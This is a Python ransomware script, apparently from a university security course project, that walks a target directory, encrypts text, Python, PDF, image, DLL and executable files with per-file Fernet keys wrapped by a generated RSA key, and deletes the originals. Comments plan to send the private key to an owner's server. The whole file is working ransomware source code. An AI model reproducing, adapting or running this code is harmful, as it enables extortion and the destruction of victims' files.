# Restructured ransomware
import os
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.fernet import Fernet

public_key = None
ext_to_encrypt = ['txt', 'py', 'pdf', 'jpeg', 'dll', 'exe']
path = '/home/l30/Desktop/LP4/TDA602/project/ransomware/target'
private_key = None
# Initialize ransomware
def init():
    global private_key
    # Create RSA private key
    private_key = rsa.generate_private_key(
                        public_exponent=65537,
                        key_size=2048
                        )
    # Export private key to file
    key_pem = private_key.private_bytes(
                            encoding=serialization.Encoding.PEM,
                            format=serialization.PrivateFormat.PKCS8,
                            encryption_algorithm=serialization.BestAvailableEncryption(b'ransom')
                            )
    with open('key.pem', 'wb') as pem:
        pem.write(key_pem)

    global public_key
    public_key = private_key.public_key()

    #del private_key, key_pem

    # TODO: send key file to owner's server
    # TODO: delete private key file after sending

# Collection of all files with exts
# Looks for txt and py files in the directory, appending their path to a list
def locate_files (path, exts):
    file_paths = []
    for root, _, files in os.walk(path):
        for file in files:
            if file.split('.')[-1] in exts:
                file_paths.append(root + '/' + file)
    return file_paths

# Encrypt a file symmestric key with public_key
def encrypt_key (key): 
    if public_key is not None:
        return public_key.encrypt ( key, 
                                    padding.OAEP (
                                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                        algorithm=hashes.SHA256(),
                                        label=None)
                                    )
                                    
# Encrypt a file with symmestric key                                    
def encrypt_file (path):
    # Generate asymmetric key
    key = Fernet.generate_key()
    f = Fernet(key)
    # Read data and encrypt it. 
    with open(path, 'rb') as file:
        unencrypted_data = file.read()
    encrypted_data = f.encrypt(unencrypted_data)
    with open(path + '.encrypted', 'wb') as f:
        f.write(encrypt_key(key))
        f.write('\n----- data -----\n'.encode('utf-8'))
        f.write(encrypted_data)
    os.remove(path)

def run():
    global path, ext_to_encrypt
    paths = locate_files(path, ext_to_encrypt)
    for path in paths:
        encrypt_file(path)

if __name__ == '__main__':
    init()
    run()